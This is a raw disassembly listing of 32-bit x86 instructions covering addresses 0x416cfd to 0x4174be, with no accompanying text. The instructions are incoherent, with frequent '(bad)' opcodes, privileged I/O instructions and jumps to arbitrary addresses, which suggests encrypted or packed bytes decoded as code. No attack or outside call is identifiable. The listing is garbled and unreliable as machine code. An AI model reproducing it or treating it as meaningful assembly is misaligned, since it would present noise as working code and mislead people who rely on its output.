  416cfd:	pop    eax
  416cfe:	xchg   ecx,eax
  416cff:	test   esp,ebp
  416d01:	push   ds
  416d02:	and    ecx,DWORD PTR [edi-0x15]
  416d05:	xchg   esi,eax
  416d06:	std    
  416d07:	ins    BYTE PTR es:[edi],dx
  416d08:	(bad)  
  416d09:	fs fmulp st(1),st
  416d0c:	rcr    BYTE PTR [edi-0x6d],cl
  416d0f:	sbb    al,0x5
  416d11:	pusha  
  416d12:	mov    DWORD PTR [edi],0xc9087726
  416d18:	jno    0x416cb3
  416d1a:	lea    ebx,[ebx]
  416d1c:	retf   
  416d1d:	lods   eax,DWORD PTR ds:[esi]
  416d1e:	push   es
  416d1f:	sbb    dh,BYTE PTR [ecx+ebp*1-0x634185a0]
  416d26:	xor    DWORD PTR [edx-0x466a0add],ebx
  416d2c:	adc    esi,DWORD PTR ds:0x24739fa0
  416d32:	mov    ah,0x39
  416d34:	push   cs
  416d35:	mov    cl,0x35
  416d37:	fnstcw WORD PTR [ecx+0x36c97a79]
  416d3d:	pop    es
  416d3e:	jge    0x416ce2
  416d40:	das    
  416d41:	cwde   
  416d42:	pushf  
  416d43:	cmp    DWORD PTR [esi],edx
  416d45:	sbb    al,0x12
  416d47:	sbb    dl,BYTE PTR [ebp+0x43686fe1]
  416d4d:	push   ebx
  416d4e:	ja     0x416d85
  416d50:	(bad)  
  416d51:	das    
  416d52:	mov    eax,ds:0xe42a6648
  416d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d58:	outs   dx,DWORD PTR ds:[esi]
  416d59:	pushf  
  416d5a:	stos   BYTE PTR es:[edi],al
  416d5b:	arpl   WORD PTR [edi],dx
  416d5d:	cld    
  416d5e:	daa    
  416d5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d60:	cmc    
  416d61:	bound  esp,QWORD PTR [ecx-0x17440906]
  416d67:	clc    
  416d68:	xchg   ebx,eax
  416d69:	int3   
  416d6a:	sub    eax,0xbf195584
  416d6f:	ret    0xc219
  416d72:	in     eax,0xac
  416d74:	push   ss
  416d75:	adc    al,0xd0
  416d77:	xor    BYTE PTR ds:0xa63077a8,dh
  416d7d:	mov    dl,BYTE PTR [ebx+0x1bf96a56]
  416d83:	cwde   
  416d84:	xchg   edi,eax
  416d85:	iret   
  416d86:	aaa    
  416d87:	popf   
  416d88:	mov    ebp,0x26d237e7
  416d8d:	jmp    0x416d13
  416d8f:	or     BYTE PTR [esi+0x4e],dh
  416d92:	and    al,0x31
  416d94:	add    al,0xf9
  416d96:	call   0x6babbc0d
  416d9b:	mov    edx,0xd548425c
  416da0:	xlat   BYTE PTR ds:[ebx]
  416da1:	arpl   cx,dx
  416da3:	jg     0x416ddc
  416da5:	dec    esi
  416da6:	lock out 0x52,eax
  416da9:	cmc    
  416daa:	(bad)  
  416dab:	dec    ecx
  416dac:	and    DWORD PTR [esi+0x6245c32d],0x3d23acdb
  416db6:	call   0x7495331b
  416dbb:	mov    esi,0x4238398
  416dc0:	pusha  
  416dc1:	xchg   ebx,eax
  416dc2:	in     al,0x81
  416dc4:	sbb    al,0xe0
  416dc6:	mov    ds:0x8db10d73,eax
  416dcb:	pop    esi
  416dcc:	xchg   esp,eax
  416dcd:	jg     0x416d88
  416dcf:	idiv   esp
  416dd1:	mov    ds:0xdc5c5525,al
  416dd6:	pop    ebp
  416dd7:	push   es
  416dd8:	mov    ecx,0x74385103
  416ddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dde:	jbe    0x416e2e
  416de0:	sbb    edi,DWORD PTR [esi]
  416de2:	cwde   
  416de3:	and    al,0x33
  416de5:	adc    eax,0xb64895c
  416dea:	pop    es
  416deb:	xchg   edi,eax
  416dec:	pop    esp
  416ded:	mov    ecx,0x98c76202
  416df2:	xchg   BYTE PTR [esi+0x2],dh
  416df5:	rcr    BYTE PTR [ebp+0xe],1
  416df8:	jecxz  0x416ddd
  416dfa:	in     eax,0xe6
  416dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dfd:	mov    bl,0xea
  416dff:	sub    eax,ebx
  416e01:	add    ebp,DWORD PTR [ecx-0x3944f3b5]
  416e07:	inc    ebx
  416e08:	repz sti 
  416e0a:	(bad)  
  416e0b:	mov    ebx,0x89e9ba9b
  416e10:	lods   eax,DWORD PTR ds:[esi]
  416e11:	(bad)  
  416e12:	jecxz  0x416da4
  416e14:	in     al,0x34
  416e16:	mov    ds:0xbadd40d2,al
  416e1b:	adc    DWORD PTR [ecx-0x11],0xd69c3304
  416e22:	or     eax,0x1d84162f
  416e27:	daa    
  416e28:	mov    BYTE PTR [edx-0x13],cl
  416e2b:	sti    
  416e2c:	xchg   ebp,eax
  416e2d:	inc    esp
  416e2e:	shr    esi,1
  416e30:	sub    bh,BYTE PTR ds:0xdf0df4df
  416e36:	pop    esi
  416e37:	add    ebp,DWORD PTR [ecx+0x3e70b1ec]
  416e3d:	repnz enter 0x1254,0xd
  416e42:	nop
  416e43:	addr16 adc al,0xf2
  416e46:	xchg   BYTE PTR [edi+0x23500350],bh
  416e4c:	pop    eax
  416e4d:	add    DWORD PTR [ebx+0x29fa0fa3],ebp
  416e53:	mov    dh,0x64
  416e55:	lock jbe 0x416de2
  416e58:	xchg   eax,ebp
  416e5a:	stos   DWORD PTR es:[edi],eax
  416e5b:	mov    ds:0xfdd8b461,eax
  416e60:	xchg   edx,eax
  416e61:	test   eax,0xadb06673
  416e66:	and    dh,cl
  416e68:	stos   DWORD PTR es:[edi],eax
  416e69:	cdq    
  416e6a:	leave  
  416e6b:	mov    eax,ds:0xfa4f7d48
  416e70:	adc    ch,dl
  416e72:	jmp    0x416e7d
  416e74:	add    ch,BYTE PTR [ebp-0x782d63a7]
  416e7a:	mov    ah,0x6c
  416e7c:	jecxz  0x416ed7
  416e7e:	in     eax,dx
  416e7f:	and    al,al
  416e81:	dec    edx
  416e82:	repnz mov ebp,0xca6fb730
  416e88:	shr    BYTE PTR [edi-0x38db7494],cl
  416e8e:	shl    DWORD PTR [eax+0x37],1
  416e91:	sbb    dl,BYTE PTR [edx+0x4f124469]
  416e97:	enter  0xa490,0x6f
  416e9b:	jae    0x416e38
  416e9d:	or     al,0xbe
  416e9f:	push   ebp
  416ea0:	adc    eax,0xad7dccf4
  416ea5:	dec    ebx
  416ea6:	out    dx,al
  416ea7:	mov    ch,BYTE PTR [esi+0x20]
  416eaa:	cmc    
  416eab:	or     BYTE PTR [esi+0x28],bh
  416eae:	shr    al,1
  416eb0:	sbb    DWORD PTR [esi],edx
  416eb2:	mov    WORD PTR ds:0xbffe2283,?
  416eb8:	and    al,0xa7
  416eba:	retf   0x9134
  416ebd:	dec    ebp
  416ebe:	add    DWORD PTR [edi],esi
  416ec0:	cmp    al,0xbe
  416ec2:	(bad)  
  416ec3:	jne    0x416efc
  416ec5:	xor    al,0x31
  416ec7:	sbb    ch,dh
  416ec9:	call   FWORD PTR [esi]
  416ecb:	and    bl,BYTE PTR [edx+0x41a23dd3]
  416ed1:	pop    eax
  416ed2:	lods   eax,DWORD PTR ds:[esi]
  416ed3:	push   ecx
  416ed4:	out    0x6,eax
  416ed6:	pop    esp
  416ed7:	cmp    eax,eax
  416ed9:	inc    esi
  416eda:	pushf  
  416edb:	mov    DWORD PTR [ecx-0x2a3a52e1],ebx
  416ee1:	inc    esp
  416ee2:	xor    DWORD PTR [ebx+0x17],ebp
  416ee5:	gs sub eax,0x16569622
  416eeb:	sbb    al,0x23
  416eed:	mov    bh,0x2b
  416eef:	fbstp  TBYTE PTR [ecx+ebx*2-0x684bd5b7]
  416ef6:	shl    DWORD PTR [esi-0x42],1
  416ef9:	and    eax,0x8f45b6e
  416efe:	and    edx,DWORD PTR [edi]
  416f00:	fstp   TBYTE PTR [edx]
  416f02:	or     ecx,edx
  416f04:	pop    es
  416f05:	jns    0x416ecb
  416f07:	rol    DWORD PTR [edx],cl
  416f09:	std    
  416f0a:	jo     0x416ee1
  416f0c:	xlat   BYTE PTR ds:[ebx]
  416f0d:	ret    0x53f6
  416f10:	add    ch,BYTE PTR [eax+ebx*8-0x711bec42]
  416f17:	jl     0x416f68
  416f19:	dec    ecx
  416f1a:	mov    cl,0xdd
  416f1c:	lods   eax,DWORD PTR ds:[esi]
  416f1d:	sub    dl,BYTE PTR [eax+0x5d]
  416f20:	(bad)  
  416f21:	daa    
  416f22:	cwde   
  416f23:	addr16 jae 0x416f17
  416f26:	add    esi,ebp
  416f28:	ja     0x416ed0
  416f2a:	pop    esi
  416f2b:	mov    ebp,0xdbfc7d75
  416f30:	push   esi
  416f31:	leave  
  416f32:	cld    
  416f33:	mov    esp,0x9988a0f9
  416f38:	je     0x416f6c
  416f3a:	push   eax
  416f3b:	and    eax,0x9acbf4eb
  416f40:	xor    esp,DWORD PTR [eax]
  416f42:	jecxz  0x416ee3
  416f44:	jmp    DWORD PTR [ebx+0x5d]
  416f47:	mov    eax,0x19be59b9
  416f4c:	dec    esi
  416f4d:	sub    BYTE PTR [ecx+0x1772afcd],cl
  416f53:	xchg   ecx,eax
  416f54:	dec    ebp
  416f55:	lahf   
  416f56:	out    dx,eax
  416f57:	push   eax
  416f58:	dec    ebx
  416f59:	out    dx,al
  416f5a:	test   eax,0xb480537c
  416f5f:	dec    esi
  416f60:	test   eax,0xd481438e
  416f65:	dec    esi
  416f66:	daa    
  416f67:	int3   
  416f68:	dec    ebx
  416f69:	aam    0xc
  416f6b:	dec    ebp
  416f6c:	push   es
  416f6d:	inc    BYTE PTR [eax+0x392dac87]
  416f73:	fucomp st(0)
  416f75:	sti    
  416f76:	sbb    ah,BYTE PTR [esi]
  416f78:	jg     0x416f81
  416f7a:	mov    ebp,0x3a17818c
  416f7f:	mov    edx,eax
  416f81:	mov    esp,0x3a998d79
  416f86:	sahf   
  416f87:	adc    ebx,ebx
  416f89:	xchg   esi,eax
  416f8a:	jns    0x416fa2
  416f8c:	call   0x889b8b6f
  416f91:	clc    
  416f92:	aam    0xff
  416f94:	das    
  416f95:	repnz mov esp,0xab9228a0
  416f9b:	lds    edi,FWORD PTR [ecx]
  416f9d:	in     eax,dx
  416f9e:	jo     0x416fd7
  416fa0:	pop    esi
  416fa1:	xchg   ebx,eax
  416fa2:	mov    eax,ds:0x2868698c
  416fa7:	mov    edx,0x2668b61e
  416fac:	lods   al,BYTE PTR ds:[esi]
  416fad:	or     BYTE PTR [eax-0x30],bl
  416fb0:	ficomp WORD PTR [edx]
  416fb2:	push   0x4494ae54
  416fb7:	(bad)  
  416fb8:	pop    edx
  416fb9:	adc    al,0x77
  416fbb:	(bad)  
  416fbc:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fbe:	rol    BYTE PTR [edx],0x3b
  416fc1:	aad    0xc6
  416fc3:	(bad)  [ebx]
  416fc5:	enter  0x69dc,0xf3
  416fc9:	ret    
  416fca:	dec    esp
  416fcb:	clc    
  416fcc:	lods   eax,DWORD PTR ds:[esi]
  416fcd:	dec    esi
  416fce:	sti    
  416fcf:	es dec eax
  416fd1:	mov    ebx,0x2ba86cad
  416fd6:	jge    0x416fd0
  416fd8:	shr    DWORD PTR [ebx+0x74],1
  416fdb:	mov    ecx,DWORD PTR [edi-0x2aa63805]
  416fe1:	xor    eax,0x6f80f4dc
  416fe6:	xchg   edi,eax
  416fe7:	retf   
  416fe8:	or     eax,0xcdebc374
  416fed:	cmp    BYTE PTR [ebx+0x7f],dh
  416ff0:	push   0x244a2e42
  416ff5:	pop    ecx
  416ff6:	gs (bad) 
  416ff8:	add    ch,BYTE PTR ds:0xf3077526
  416ffe:	in     eax,0xbb
  417000:	mov    esp,0x792671cb
  417005:	adc    ebp,DWORD PTR [ecx+0x5f]
  417008:	xor    DWORD PTR [eax],0x58
  41700b:	mov    edx,0xa1b01157
  417010:	sbb    eax,0x53a5b309
  417015:	je     0x41707a
  417017:	sub    eax,0xaa3e6d6c
  41701c:	fcomp  DWORD PTR ss:0xef90117c
  417023:	neg    BYTE PTR [esi-0x24462e9e]
  417029:	jl     0x417097
  41702b:	or     edx,DWORD PTR [edi+ebx*2]
  41702e:	push   ss
  41702f:	add    eax,0xdf147c2d
  417034:	(bad)  
  417035:	cmp    al,0xfe
  417037:	outs   dx,BYTE PTR ds:[esi]
  417038:	cmp    BYTE PTR [esp+ecx*8],ch
  41703b:	retf   0x271a
  41703e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41703f:	out    dx,al
  417040:	sub    eax,0xf2d7dfc8
  417045:	mov    esi,0x5d953e0b
  41704a:	inc    esp
  41704b:	jo     0x416fd0
  41704d:	mov    bl,0x25
  41704f:	fistp  QWORD PTR [ebp+ebp*4+0x6c]
  417053:	ins    BYTE PTR es:[edi],dx
  417054:	das    
  417055:	inc    ebp
  417056:	(bad)  [edi+eiz*1]
  417059:	sar    BYTE PTR [edi+0x1c],0x84
  41705d:	ret    
  41705e:	cmp    bh,BYTE PTR es:[esi+0x67]
  417062:	enter  0x9378,0x7d
  417066:	(bad)  
  417067:	(bad)  
  417068:	enter  0xcf12,0xac
  41706c:	pop    esi
  41706d:	push   es
  41706e:	call   0xcef8:0xfaf6d9ed
  417075:	mov    ebp,0x779c60cb
  41707a:	mov    dl,0xbf
  41707c:	jmp    0x4170dd
  41707e:	imul   edx,DWORD PTR [esi],0x8e73033e
  417084:	test   BYTE PTR [ebp+0x65a94fb2],al
  41708a:	jecxz  0x417109
  41708c:	gs retf 
  41708e:	mov    ebp,edx
  417090:	dec    ecx
  417091:	ret    
  417092:	stos   DWORD PTR es:[edi],eax
  417093:	(bad)  
  417095:	outs   dx,BYTE PTR ds:[esi]
  417096:	js     0x4170d3
  417098:	inc    esi
  417099:	mov    ds:0xe0349ecf,al
  41709e:	and    eax,0x29b8fb86
  4170a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170a4:	adc    al,BYTE PTR [edi]
  4170a6:	cli    
  4170a7:	pushf  
  4170a8:	cdq    
  4170a9:	mov    edi,0x28e174e9
  4170ae:	ror    DWORD PTR [ecx+0x64ff82e0],1
  4170b4:	pop    edi
  4170b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170b7:	popa   
  4170b8:	jbe    0x417123
  4170ba:	jge    0x4170cb
  4170bc:	rcl    DWORD PTR ds:0x354ef6d7,0xcb
  4170c3:	mov    ?,WORD PTR ss:[ecx+0x5d2f01a7]
  4170ca:	add    ecx,DWORD PTR [esp+ebp*1+0x87acbf]
  4170d1:	xor    DWORD PTR [edi],0xffffffd0
  4170d4:	scas   eax,DWORD PTR es:[edi]
  4170d5:	sti    
  4170d6:	jb     0x417146
  4170d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170d9:	mov    al,ds:0x26701b1a
  4170de:	add    eax,0x8431792b
  4170e3:	inc    ebp
  4170e4:	and    bl,BYTE PTR [ebx+0x40]
  4170e7:	and    ecx,DWORD PTR [edx-0x56570668]
  4170ed:	ss push esp
  4170ef:	mov    esp,0x46e6c7e2
  4170f4:	and    eax,0x9e2df594
  4170f9:	clc    
  4170fa:	mov    ebx,0x4d91a41f
  4170ff:	sbb    ah,dh
  417101:	in     al,0x1a
  417103:	ja     0x4170c8
  417105:	clc    
  417106:	fwait
  417107:	jp     0x41715e
  417109:	push   0xc
  41710b:	loope  0x4170e9
  41710d:	pop    ebp
  41710e:	pop    esp
  41710f:	dec    ebx
  417110:	test   eax,0x265a5da9
  417115:	lock push ds
  417117:	sbb    al,0xc
  417119:	push   edi
  41711a:	push   esi
  41711b:	dec    edx
  41711c:	arpl   WORD PTR [ebp-0x4ff7cea8],cx
  417122:	and    bl,BYTE PTR [ebx+0x5ca6ad46]
  417128:	jb     0x417121
  41712a:	call   0x87c73e4
  41712f:	dec    eax
  417130:	adc    edi,DWORD PTR [ebp-0x677295f0]
  417136:	xor    eax,DWORD PTR [ecx+0x480ddc8]
  41713c:	test   eax,0x8a5765b5
  417141:	mov    dl,bl
  417143:	xlat   BYTE PTR ds:[ebx]
  417144:	or     esp,0x2c
  417147:	(bad)  
  417148:	fbstp  TBYTE PTR [ecx]
  41714a:	push   DWORD PTR [ebx+eax*4-0x53]
  41714e:	cmp    DWORD PTR [ecx-0x5e2af72b],edi
  417154:	test   BYTE PTR [eax+eax*8-0x5c],dl
  417158:	ins    DWORD PTR es:[edi],dx
  417159:	push   edx
  41715a:	jne    0x41713a
  41715c:	jp     0x41716b
  41715e:	cmp    BYTE PTR [ebx+0x3b0e6822],al
  417164:	xor    DWORD PTR [eax-0x6f6ea19c],ecx
  41716a:	adc    eax,0x9b92f93c
  41716f:	jne    0x4171b1
  417171:	dec    esi
  417172:	scas   al,BYTE PTR es:[edi]
  417173:	add    DWORD PTR [ebp+0x443aeeee],0xffffffec
  41717a:	aam    0xad
  41717c:	and    al,BYTE PTR [edx-0x31]
  41717f:	and    ebx,DWORD PTR [ebx]
  417181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417182:	sbb    edx,DWORD PTR [eax+eax*4]
  417185:	fistp  DWORD PTR [ecx-0x5]
  417188:	enter  0x2416,0xec
  41718c:	dec    esi
  41718d:	or     ch,BYTE PTR [ebp-0xce962d2]
  417193:	lock jns 0x41712d
  417196:	jp     0x417136
  417198:	and    DWORD PTR [ebx-0x2b],eax
  41719b:	outs   dx,BYTE PTR ds:[esi]
  41719c:	je     0x4171b5
  41719e:	push   edi
  41719f:	pop    es
  4171a0:	push   ecx
  4171a1:	shl    edi,1
  4171a3:	es cwde 
  4171a5:	jo     0x417134
  4171a7:	push   edx
  4171a8:	xor    edx,DWORD PTR [edi]
  4171aa:	pusha  
  4171ab:	jns    0x417199
  4171ad:	leave  
  4171ae:	enter  0xe2,0xb8
  4171b2:	and    BYTE PTR [edx+0x11bb3f0e],bh
  4171b8:	push   eax
  4171b9:	and    bh,BYTE PTR [ecx-0x44]
  4171bc:	ins    DWORD PTR es:[edi],dx
  4171bd:	xor    bh,BYTE PTR [ebx-0x6d50062d]
  4171c3:	mov    WORD PTR [edi],?
  4171c5:	loopne 0x4171e3
  4171c7:	dec    ebx
  4171c8:	imul   ecx,DWORD PTR [ecx-0x1362eb40],0xdc725c44
  4171d2:	es pushf 
  4171d4:	cdq    
  4171d5:	pop    ds
  4171d6:	out    dx,eax
  4171d7:	loope  0x41720c
  4171d9:	pusha  
  4171da:	sbb    BYTE PTR [esi],dl
  4171dc:	jp     0x41719d
  4171de:	out    0x96,eax
  4171e0:	sbb    al,0xc8
  4171e2:	fsubr  DWORD PTR [edi-0x50]
  4171e5:	std    
  4171e6:	rcl    ebp,0x39
  4171e9:	hlt    
  4171ea:	ss cs sbb eax,0x8e3eb6
  4171f1:	mov    bh,BYTE PTR [esi]
  4171f3:	dec    edi
  4171f4:	iret   
  4171f5:	out    dx,al
  4171f6:	jae    0x417182
  4171f8:	pop    ebx
  4171f9:	sbb    dh,BYTE PTR ds:0x6179bd49
  4171ff:	jns    0x4171a2
  417201:	(bad)  
  417202:	pop    esp
  417203:	not    eax
  417205:	mov    dh,0x43
  417207:	cwde   
  417208:	outs   dx,DWORD PTR ds:[esi]
  417209:	lds    esp,FWORD PTR [ebp-0x6bd31b9b]
  41720f:	mov    WORD PTR [eax],gs
  417211:	or     edi,DWORD PTR [ecx-0x3213c2b2]
  417217:	mov    ds:0xbf46d3bb,al
  41721c:	lock push eax
  41721e:	pusha  
  41721f:	xlat   BYTE PTR ds:[ebx]
  417220:	sub    bl,bl
  417222:	adc    eax,0xfe276e98
  417227:	sbb    al,0xdf
  417229:	mov    bh,0x52
  41722b:	nop
  41722c:	clc    
  41722d:	aas    
  41722e:	ds push eax
  417230:	mov    bl,0xb
  417232:	(bad)  
  417233:	leave  
  417234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417235:	inc    esi
  417236:	loope  0x4172b0
  417238:	xchg   ebp,eax
  417239:	(bad)  
  41723a:	(bad)  
  41723b:	js     0x4172ab
  41723d:	adc    ch,ch
  41723f:	ror    ebp,cl
  417241:	fxch   st(3)
  417243:	(bad)  
  417244:	je     0x41726a
  417246:	jno    0x4171ff
  417248:	call   FWORD PTR [edx-0x4687e0af]
  41724e:	gs retf 
  417250:	je     0x417202
  417252:	divps  xmm7,xmm0
  417255:	ins    BYTE PTR es:[edi],dx
  417256:	push   cs
  417257:	xchg   ebx,eax
  417258:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417259:	test   esp,esp
  41725b:	js     0x4171e2
  41725d:	not    BYTE PTR [ebx+edx*4+0x46]
  417261:	or     esi,DWORD PTR [ebx]
  417263:	ds cli 
  417265:	or     DWORD PTR [ebx-0x59],esp
  417268:	stos   DWORD PTR es:[edi],eax
  417269:	mov    ah,0xdf
  41726b:	pop    ss
  41726c:	inc    edi
  41726d:	sbb    ebx,esp
  41726f:	lods   eax,DWORD PTR ds:[esi]
  417270:	push   cs
  417271:	ret    0x9c25
  417274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417275:	inc    ecx
  417276:	sub    eax,0x94436097
  41727b:	in     al,0xd2
  41727d:	or     DWORD PTR [esi],edx
  41727f:	jmp    0xe3e5c56c
  417284:	xor    BYTE PTR [esi+0x4060aa59],dl
  41728a:	inc    esp
  41728b:	sub    al,0x4
  41728d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41728e:	sahf   
  41728f:	cmp    DWORD PTR [eax],eax
  417291:	popf   
  417292:	mov    eax,0x6c7bd886
  417297:	cli    
  417298:	pop    ds
  417299:	xor    BYTE PTR [edx],al
  41729b:	xchg   esp,eax
  41729c:	dec    eax
  41729d:	xor    eax,0xc8976675
  4172a2:	outs   dx,BYTE PTR ds:[esi]
  4172a3:	ins    DWORD PTR es:[edi],dx
  4172a4:	dec    esi
  4172a5:	lods   eax,DWORD PTR ds:[esi]
  4172a6:	scas   eax,DWORD PTR es:[edi]
  4172a7:	out    dx,al
  4172a8:	push   esi
  4172a9:	jmp    0xa976:0xdc391604
  4172b0:	out    0x88,eax
  4172b2:	scas   eax,DWORD PTR es:[edi]
  4172b3:	addr16 mov al,ds:0x6d47
  4172b7:	repnz xchg ebp,eax
  4172b9:	shl    BYTE PTR [ebp-0x239a88c6],1
  4172bf:	sub    DWORD PTR [esi+0x64],ebp
  4172c2:	jmp    0xf8ab47d6
  4172c7:	push   ds
  4172c8:	xor    DWORD PTR ss:[esi+0x71d043c4],ecx
  4172cf:	mov    edx,DWORD PTR [ebp+eiz*4-0x5c]
  4172d3:	push   edi
  4172d4:	(bad)  
  4172d6:	jb     0x41729e
  4172d8:	pushf  
  4172d9:	mov    ecx,0xc4a351b6
  4172de:	xor    DWORD PTR [edx+0x55],esp
  4172e1:	jmp    0x16329187
  4172e6:	jecxz  0x417361
  4172e8:	sub    DWORD PTR [ebp+0x74],0x2f
  4172ec:	icebp  
  4172ed:	mov    ds:0x82979533,al
  4172f2:	in     al,0xcc
  4172f4:	or     al,0xa4
  4172f6:	mov    ecx,0x8ea7a6e0
  4172fb:	xchg   ebx,eax
  4172fc:	das    
  4172fd:	(bad)  
  4172fe:	repnz pop eax
  417300:	cs js  0x4172b0
  417303:	test   eax,0xd39f4de2
  417308:	fs or  eax,0x1bf34c49
  41730e:	(bad)  
  41730f:	in     al,dx
  417310:	cs mov bl,0xea
  417313:	int3   
  417314:	mov    ch,0x7c
  417316:	aad    0xb0
  417318:	xor    BYTE PTR [eax-0x400cac10],dl
  41731e:	jmp    0x2ed776f7
  417323:	imul   eax,DWORD PTR [ecx+edx*8],0x70
  417327:	sbb    al,0x7b
  417329:	adc    ebp,edx
  41732b:	stc    
  41732c:	sbb    BYTE PTR [ecx],cl
  41732e:	scas   al,BYTE PTR es:[edi]
  41732f:	add    al,0xb6
  417331:	dec    ebp
  417332:	mov    al,0xe7
  417334:	lock cmp eax,edx
  417337:	out    0x34,al
  417339:	leave  
  41733a:	rcr    BYTE PTR [edx+ecx*4+0x5ccc810],cl
  417341:	dec    edi
  417342:	cmovne ebx,DWORD PTR [eax+0x1b6df275]
  417349:	lahf   
  41734a:	sub    al,0xf5
  41734c:	mov    ebp,0x44f0a541
  417351:	in     eax,dx
  417352:	mov    dh,0xc2
  417354:	sub    dh,cl
  417356:	sub    al,0x3a
  417358:	mov    ch,0x49
  41735a:	pop    eax
  41735b:	jmp    0xc850cd30
  417360:	nop
  417361:	shl    BYTE PTR [ebx-0x59bce795],cl
  417367:	mov    edx,DWORD PTR [edx+0x36a4f15a]
  41736d:	mov    eax,ds:0x3bae1622
  417372:	jp     0x4173da
  417374:	and    DWORD PTR [edx-0x105a8d55],ebp
  41737a:	push   esi
  41737b:	pusha  
  41737c:	dec    esi
  41737d:	cld    
  41737e:	jmp    0x41734b
  417380:	or     eax,0xdf6b03f
  417385:	call   0x57074a63
  41738a:	xor    ebp,edx
  41738c:	into   
  41738d:	cmp    DWORD PTR [edi-0x5acf7d64],ebx
  417393:	push   ebx
  417394:	add    bh,dl
  417396:	retf   
  417397:	push   edi
  417398:	sub    DWORD PTR [eax],0x5f77903a
  41739e:	(bad)  
  41739f:	or     al,0xc1
  4173a1:	es dec ebp
  4173a3:	cld    
  4173a4:	cmp    bh,BYTE PTR [eax+0x6d]
  4173a7:	dec    esi
  4173a8:	xchg   ebp,eax
  4173a9:	cmp    al,0x57
  4173ab:	inc    eax
  4173ac:	sbb    al,ch
  4173ae:	clc    
  4173af:	sbb    al,0x45
  4173b1:	add    al,0xd7
  4173b3:	adc    al,0x1
  4173b5:	aam    0xca
  4173b7:	into   
  4173b8:	in     al,dx
  4173b9:	shl    BYTE PTR [edi-0x59],cl
  4173bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173bd:	clc    
  4173be:	stos   DWORD PTR es:[edi],eax
  4173bf:	pop    ebp
  4173c0:	out    dx,al
  4173c1:	ds adc al,0x6f
  4173c4:	pop    edi
  4173c5:	mov    WORD PTR [ebx+esi*8+0x71dc24bb],?
  4173cc:	pushf  
  4173cd:	bound  ecx,QWORD PTR [eax+0x5f042f8d]
  4173d3:	das    
  4173d4:	pop    edi
  4173d5:	dec    edi
  4173d6:	hlt    
  4173d7:	pop    esp
  4173d8:	cmp    al,0x81
  4173da:	std    
  4173db:	push   ebp
  4173dc:	xor    eax,0xb06c9015
  4173e1:	push   edx
  4173e2:	xchg   ecx,eax
  4173e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173e4:	fnstsw WORD PTR [ebp+0x4580e1de]
  4173ea:	es rcl esi,0xf0
  4173ee:	ins    DWORD PTR es:[edi],dx
  4173ef:	dec    ecx
  4173f0:	push   cs
  4173f1:	stc    
  4173f2:	rcl    BYTE PTR cs:[edi-0x63f3d6d1],1
  4173f9:	mov    esp,0x8a9459bb
  4173fe:	jnp    0x4173b5
  417400:	int    0x97
  417402:	mov    ds,WORD PTR [ebp-0x4000eee8]
  417408:	pop    ecx
  417409:	imul   eax,DWORD PTR [ecx+0x58872ee6],0xe25f40dc
  417413:	test   DWORD PTR [edx],ecx
  417415:	(bad)  
  417416:	fs or  ch,bl
  417419:	push   ecx
  41741a:	push   ss
  41741b:	dec    edi
  41741c:	daa    
  41741d:	sbb    DWORD PTR [edi+0x0],edx
  417420:	test   BYTE PTR [ebp+esi*1-0x82e01ca],0x2b
  417428:	clc    
  417429:	mov    edi,0x1b0afea2
  41742e:	fdivr  DWORD PTR ds:0x6e163cb1
  417434:	(bad)  
  417436:	dec    eax
  417437:	cdq    
  417438:	pop    ds
  417439:	fisttp WORD PTR [edi+edx*2+0x24b4091a]
  417440:	push   ecx
  417441:	in     al,0xe
  417443:	fidivr WORD PTR cs:[esi]
  417446:	nop
  417447:	les    edx,FWORD PTR [ecx+eiz*8-0x1821dbe]
  41744e:	cld    
  41744f:	lds    edi,FWORD PTR [edx-0x69c32aa9]
  417455:	bound  ecx,QWORD PTR ds:0xf4ba92bf
  41745b:	lods   al,BYTE PTR ds:[esi]
  41745c:	jno    0x417451
  41745e:	mov    bh,0xd2
  417460:	ins    BYTE PTR es:[edi],dx
  417461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417462:	outs   dx,DWORD PTR ds:[esi]
  417463:	lock adc esi,DWORD PTR [ebp+0x79f1d4e3]
  41746a:	repnz mov ds:0xce6365a6,al
  417470:	adc    DWORD PTR [edi],ebp
  417472:	or     bh,bh
  417474:	rol    DWORD PTR [eax],0xc
  417477:	lahf   
  417478:	xor    edi,ebx
  41747a:	xchg   edi,eax
  41747b:	and    eax,0x46e15633
  417480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417481:	ret    0x1225
  417484:	xor    al,0xe5
  417486:	xchg   ecx,eax
  417487:	xchg   ecx,eax
  417488:	mov    al,0x6c
  41748a:	aad    0x46
  41748c:	xor    DWORD PTR [ebp+0xe56f022],edi
  417492:	adc    BYTE PTR [ecx+0x4348314],cl
  417498:	or     BYTE PTR [ecx],cl
  41749a:	pop    edi
  41749b:	pushf  
  41749c:	mov    WORD PTR [eax+0x67aabd30],ss
  4174a2:	dec    ebx
  4174a3:	xchg   ebx,eax
  4174a4:	push   edi
  4174a5:	les    ecx,FWORD PTR [edx-0x59]
  4174a8:	push   ss
  4174a9:	xchg   BYTE PTR [ebx+0x69],ch
  4174ac:	scas   al,BYTE PTR es:[edi]
  4174ad:	jo     0x4174e5
  4174af:	mov    eax,ds:0xfc7d52a
  4174b4:	mov    esi,esp
  4174b6:	dec    esi
  4174b7:	outs   dx,BYTE PTR ds:[esi]
  4174b8:	xchg   ebx,eax
  4174b9:	(bad)  
  4174ba:	jae    0x417521
  4174bc:	pop    edi
  4174bd:	pop    esp
  4174be:	ds inc eax
